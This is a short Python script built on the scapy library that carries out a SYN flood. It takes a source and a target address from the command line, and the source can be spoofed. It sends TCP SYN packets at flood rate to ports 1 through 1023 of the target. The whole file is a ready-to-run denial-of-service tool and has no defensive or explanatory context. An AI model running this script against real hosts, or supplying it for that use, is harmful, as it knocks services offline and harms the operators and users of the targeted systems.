#!/usr/bin/python
# coding=utf-8
# ===============================================================================
#
#         FILE: syn-flooding.py
#
#        USAGE: ./syn-flooding.py
#
#  DESCRIPTION:
#
#      OPTIONS: ---
# REQUIREMENTS: ---
#         BUGS: ---
#        NOTES: ---
#       AUTHOR: James Zhu (), zhujian0805@gmail.com
# ORGANIZATION: ZJ
#      VERSION: 1.0
#      CREATED: Fri 04 Aug 2017 10:43:35 PM CST
#     REVISION: ---
# ===============================================================================

import sys
from scapy.all import srflood, IP, TCP

if len(sys.argv) < 3:
    print sys.argv[0] + " Source Target"
    sys.exit(0)

packet = IP(
    src=sys.argv[1], dst=sys.argv[2]) / TCP(
        dport=range(1, 1024), flags="S")

srflood(packet, store=0)
